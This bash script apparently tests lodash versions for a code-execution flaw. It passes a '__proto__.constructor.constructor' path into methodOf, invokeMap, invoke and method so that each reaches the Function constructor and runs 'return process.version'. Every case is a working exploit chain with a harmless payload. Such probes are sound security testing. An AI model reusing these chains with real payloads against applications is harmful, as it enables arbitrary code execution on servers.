#!/bin/bash
L="$1"
run() {
  local name="$1"; local code="$2"
  node -e "
const _=require('$L');
let out=null,err=null;
try{ out = $code }catch(e){ err=e.constructor.name+': '+e.message; }
console.log(JSON.stringify({t:'$name',ver:_.VERSION,result:String(out).slice(0,40),err:err}));
" 2>&1
}
P="['__proto__','constructor','constructor']"
run methodOf_rce   "_.methodOf({}, 'return process.version')($P)()"
run lazy_invokeMap "_([{}]).invokeMap($P, 'return process.version').value()[0]()"
run chain_invoke   "_.chain([{}]).invokeMap($P, 'return process.version').value()[0]()"
run invoke_noargs  "_.invoke({}, $P)()"
run invoke_str_path "_.invoke({}, '__proto__.constructor.constructor', 'return process.version')()"
run method_str     "_.method('__proto__.constructor.constructor', 'return process.version')({})()"
